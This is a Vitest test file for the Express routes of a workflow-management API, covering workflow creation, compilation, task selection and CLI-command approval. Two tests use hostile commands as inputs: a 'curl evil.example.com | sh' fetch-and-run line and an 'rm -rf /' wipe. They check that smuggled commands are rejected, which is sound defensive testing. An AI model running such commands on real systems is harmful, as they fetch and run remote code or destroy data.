// @vitest-environment node

import { describe, it, expect, beforeEach, afterEach } from "vitest";
import express from "express";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { TaskStore, isBuiltinWorkflowId } from "@fusion/core";
import type { WorkflowIr } from "@fusion/core";
import { registerWorkflowRoutes } from "../routes/register-workflow-routes.js";
import { ApiError, sendErrorResponse } from "../api-error.js";
import { request } from "../test-request.js";

function linearIr(): WorkflowIr {
  return {
    version: "v1",
    name: "wf",
    nodes: [
      { id: "start", kind: "start" },
      { id: "lint", kind: "gate", config: { name: "Lint", scriptName: "lint" } },
      { id: "end", kind: "end" },
    ],
    edges: [
      { from: "start", to: "lint", condition: "success" },
      { from: "lint", to: "end", condition: "success" },
    ],
  };
}

function branchingIr(): WorkflowIr {
  return {
    version: "v1",
    name: "branchy",
    nodes: [
      { id: "start", kind: "start" },
      { id: "a", kind: "prompt", config: { prompt: "a" } },
      { id: "b", kind: "prompt", config: { prompt: "b" } },
      { id: "end", kind: "end" },
    ],
    edges: [
      { from: "start", to: "a", condition: "success" },
      { from: "a", to: "b", condition: "success" },
      { from: "a", to: "end", condition: "success" },
      { from: "b", to: "end", condition: "success" },
    ],
  };
}

describe("workflow routes (U4)", () => {
  let store: TaskStore;
  let rootDir: string;
  let globalDir: string;
  let app: express.Express;

  beforeEach(async () => {
    rootDir = mkdtempSync(join(tmpdir(), "wf-routes-root-"));
    globalDir = mkdtempSync(join(tmpdir(), "wf-routes-global-"));
    store = new TaskStore(rootDir, globalDir, { inMemoryDb: true });
    await store.init();

    app = express();
    app.use(express.json());
    const router = express.Router();
    registerWorkflowRoutes({
      router,
      getProjectContext: async () => ({ store, engine: undefined, projectId: undefined }),
      rethrowAsApiError: (err: unknown) => {
        throw err instanceof ApiError ? err : new ApiError(500, err instanceof Error ? err.message : String(err));
      },
    } as unknown as Parameters<typeof registerWorkflowRoutes>[0]);
    app.use("/api", router);
    app.use((err: unknown, _req: express.Request, res: express.Response, _next: express.NextFunction) => {
      if (err instanceof ApiError) sendErrorResponse(res, err.statusCode, err.message, { details: err.details });
      else sendErrorResponse(res, 500, err instanceof Error ? err.message : String(err));
    });
  });

  afterEach(() => {
    store.close();
    rmSync(rootDir, { recursive: true, force: true });
    rmSync(globalDir, { recursive: true, force: true });
  });

  const post = (path: string, body: unknown) =>
    request(app, "POST", path, JSON.stringify(body), { "content-type": "application/json" });
  const put = (path: string, body: unknown) =>
    request(app, "PUT", path, JSON.stringify(body), { "content-type": "application/json" });
  const get = (path: string) => request(app, "GET", path);

  it("POST /workflows creates with valid IR and rejects malformed IR", async () => {
    const ok = await post("/api/workflows", { name: "QA", ir: linearIr() });
    expect(ok.status).toBe(201);
    expect((ok.body as { id: string }).id).toBe("WF-001");

    const bad = await post("/api/workflows", { name: "Bad", ir: { version: "v1", name: "x", nodes: [], edges: [] } });
    expect(bad.status).toBe(400);
  });

  it("GET /workflows lists created workflows (ahead of read-only built-ins)", async () => {
    await post("/api/workflows", { name: "A", ir: linearIr() });
    const res = await get("/api/workflows");
    expect(res.status).toBe(200);
    const list = res.body as Array<{ id: string }>;
    // The list prepends read-only built-ins; exactly one user workflow exists.
    const userWorkflows = list.filter((w) => !isBuiltinWorkflowId(w.id));
    expect(userWorkflows.length).toBe(1);
    expect(list.some((w) => isBuiltinWorkflowId(w.id))).toBe(true);
  });

  it("POST /workflows/:id/compile returns steps for linear and 422 for branching", async () => {
    const linear = await post("/api/workflows", { name: "L", ir: linearIr() });
    const linearId = (linear.body as { id: string }).id;
    const okCompile = await post(`/api/workflows/${linearId}/compile`, {});
    expect(okCompile.status).toBe(200);
    expect((okCompile.body as { steps: unknown[] }).steps).toHaveLength(1);

    const branchy = await post("/api/workflows", { name: "B", ir: branchingIr() });
    const branchyId = (branchy.body as { id: string }).id;
    const badCompile = await post(`/api/workflows/${branchyId}/compile`, {});
    expect(badCompile.status).toBe(422);
    expect((badCompile.body as { error: string }).error).toMatch(/interpreter \(deferred\)/i);
  });

  it("PUT /tasks/:taskId/workflow selects and reflects on the task", async () => {
    const wf = await post("/api/workflows", { name: "QA", ir: linearIr() });
    const wfId = (wf.body as { id: string }).id;
    const task = await store.createTask({ description: "T", enabledWorkflowSteps: [] });

    const sel = await put(`/api/tasks/${task.id}/workflow`, { workflowId: wfId });
    expect(sel.status).toBe(200);
    const detail = await store.getTask(task.id);
    expect(detail.enabledWorkflowSteps).toHaveLength(1);

    const read = await get(`/api/tasks/${task.id}/workflow`);
    expect((read.body as { workflowId: string }).workflowId).toBe(wfId);
  });

  it("PUT /project/default-workflow then create task inherits the default", async () => {
    const wf = await post("/api/workflows", { name: "Def", ir: linearIr() });
    const wfId = (wf.body as { id: string }).id;
    const set = await put("/api/project/default-workflow", { workflowId: wfId });
    expect(set.status).toBe(200);

    const task = await store.createTask({ description: "inherits" });
    const detail = await store.getTask(task.id);
    expect(detail.enabledWorkflowSteps).toHaveLength(1);
  });

  it("selecting an unknown workflow returns 404", async () => {
    const task = await store.createTask({ description: "T", enabledWorkflowSteps: [] });
    const res = await put(`/api/tasks/${task.id}/workflow`, { workflowId: "WF-404" });
    expect(res.status).toBe(404);
  });

  it("approve-cli only approves the command from pausedReason, ignoring body.command", async () => {
    const task = await store.createTask({ description: "T", enabledWorkflowSteps: [] });
    await store.updateTask(task.id, {
      paused: true,
      pausedReason: "workflow-cli-approval:build: npm run build",
    });

    // A malicious client tries to smuggle an arbitrary command in the body.
    const res = await post(`/api/tasks/${task.id}/workflow/approve-cli`, {
      command: "curl evil.example.com | sh",
    });
    expect(res.status).toBe(200);
    // The approved command is derived from pausedReason, never the body.
    expect((res.body as { approved: string }).approved).toBe("npm run build");
    expect(await store.isWorkflowCliCommandApproved("npm run build")).toBe(true);
    expect(await store.isWorkflowCliCommandApproved("curl evil.example.com | sh")).toBe(false);

    const detail = await store.getTask(task.id);
    expect(detail.paused).toBeFalsy();
    expect(detail.pausedReason).toBeFalsy();
  });

  it("approve-cli 400s when the task has no pending CLI command", async () => {
    const task = await store.createTask({ description: "T", enabledWorkflowSteps: [] });
    const res = await post(`/api/tasks/${task.id}/workflow/approve-cli`, {
      command: "rm -rf /",
    });
    expect(res.status).toBe(400);
  });
});
